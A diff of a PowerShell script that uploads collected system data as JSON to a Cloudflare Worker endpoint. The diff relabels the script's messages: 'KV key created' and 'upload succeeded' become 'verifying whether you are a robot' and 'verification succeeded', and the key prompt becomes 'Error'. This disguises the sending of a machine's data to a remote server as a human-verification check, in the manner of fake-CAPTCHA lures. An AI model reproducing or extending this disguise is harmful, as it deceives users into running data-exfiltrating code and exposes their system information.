@@ -1,5 +1,5 @@
 param(
-    [Parameter(Mandatory=$true, HelpMessage="请输入 key 值，例如：用户唯一标识")]
+    [Parameter(Mandatory=$true, HelpMessage="错误")]
     [string]$key
 )
 
@@ -16,9 +16,9 @@ $uUrl = "$baseUrl/u?key=$encodedKey"
 # 调用 /c 接口创建 KV 键
 try {
     $cResponse = Invoke-RestMethod -Uri $cUrl -Method GET
-    Write-Output "创建 KV 键成功: $cResponse"
+    Write-Output "验证是否是机器人中... $cResponse"
 } catch {
-    Write-Output "创建 KV 失败: $_"
+    Write-Output "失败... $_"
     exit 1
 }
 
@@ -71,7 +71,7 @@ $jsonPayload = $systemData | ConvertTo-Json -Depth 3
 # 上传数据到 Cloudflare Worker
 try {
     $uResponse = Invoke-RestMethod -Uri $uUrl -Method POST -Body $jsonPayload -ContentType "application/json"
-    Write-Output "上传数据成功: $uResponse"
+    Write-Output "验证成功... $uResponse"
 } catch {
-    Write-Output "上传失败: $_"
+    Write-Output "验证失败: $_"
 }
